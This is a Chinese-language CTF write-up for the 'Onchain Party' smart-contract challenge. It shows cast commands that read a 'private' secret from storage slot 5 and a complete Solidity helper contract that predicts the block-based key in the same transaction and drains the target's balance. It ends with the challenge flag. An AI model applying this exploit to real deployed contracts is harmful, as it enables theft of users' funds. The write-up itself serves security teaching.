# Onchain Party

## 题目简述

`Setup.isSolved()` 要求 `OnChainParty` 的余额归零。玩家先向合约发送至少 `0.5 ether` 成为成员，再调用 `unlockVault(bytes16)` 才能一次取走全部余额。该函数要求 16 字节 key 同时包含基于私有 `secret` 和当前区块参数计算的 4 字节值、调用者地址低 8 字节，以及函数选择器低 4 字节。关键问题是链上 `private` 存储仍可读取，所谓随机数也能在同一笔交易中同步计算。

## 解题过程

### 读取私有状态

按继承后的存储布局计算槽位：`Ownable.owner` 位于 slot 0，`ReentrancyGuard._status` 位于 slot 1，随后是 `lockOwnerTransferTime`、动态数组槽、mapping 槽，故 `bytes8 secret` 位于 slot 5：

```bash
TARGET=$(cast call "$SETUP" "TARGET()(address)" --rpc-url "$RPC")
SECRET_WORD=$(cast storage "$TARGET" 5 --rpc-url "$RPC")
```

`private` 只限制 Solidity 代码中的直接访问，不会加密公共链上的 storage。

### 在同一交易内拼接 key

key 的布局为：

```text
4 bytes  randomize(secret)
8 bytes  address(helper) 的低 8 字节
4 bytes  unlockVault(bytes16) 的函数选择器
```

`randomize` 依赖 `block.prevrandao` 和 `block.timestamp`。辅助合约先计算它、再在同一交易中调用目标，两次看到的区块参数相同。辅助合约同时用构造函数转入至少 `0.5 ether`，让自身地址成为 member：

```solidity
pragma solidity ^0.8.22;

interface IParty {
    function unlockVault(bytes16 key) external;
}

contract PartyHack {
    IParty public target;

    constructor(address payable targetAddress) payable {
        require(msg.value >= 0.5 ether);
        target = IParty(targetAddress);
        (bool ok,) = targetAddress.call{value: msg.value}("");
        require(ok);
    }

    function randomize(bytes8 secret) private view returns (bytes4) {
        return bytes4(
            keccak256(
                abi.encode(
                    secret,
                    block.prevrandao,
                    keccak256(abi.encode(block.timestamp))
                )
            )
        );
    }

    function drain(bytes32 storageWord) external {
        bytes8 secret = bytes8(uint64(uint256(storageWord)));
        bytes4 part1 = randomize(secret);
        bytes8 part2 = bytes8(uint64(uint160(address(this))));
        bytes4 part3 = bytes4(keccak256("unlockVault(bytes16)"));
        target.unlockVault(bytes16(bytes.concat(part1, part2, part3)));
    }

    receive() external payable {}
}
```

部署辅助合约、传入 `SECRET_WORD` 调用 `drain` 后，目标余额被转给辅助合约。最后检查：

```bash
cast call "$SETUP" "isSolved()(bool)" --rpc-url "$RPC"
```

官方解法给出的 flag 为：

```text
shellmates{$H1Ft_l3fT_$hIft_R1GHT_AND_bitw1sE_fL4g_RIS3}
```

## 方法总结

- 核心技巧：读取 EVM storage 中的私有值，并在单笔交易内复现依赖区块参数的伪随机计算，按位拼接校验 key。
- 识别信号：合约把 `private` 当秘密、随机数只由当前区块字段和可读状态生成、校验又允许攻击合约同区块调用时，应考虑链上同步预测。
- 复用要点：继承合约会占用前置 storage slot；读取短整数或定长字节时还要确认其在 32 字节槽中的对齐方式。
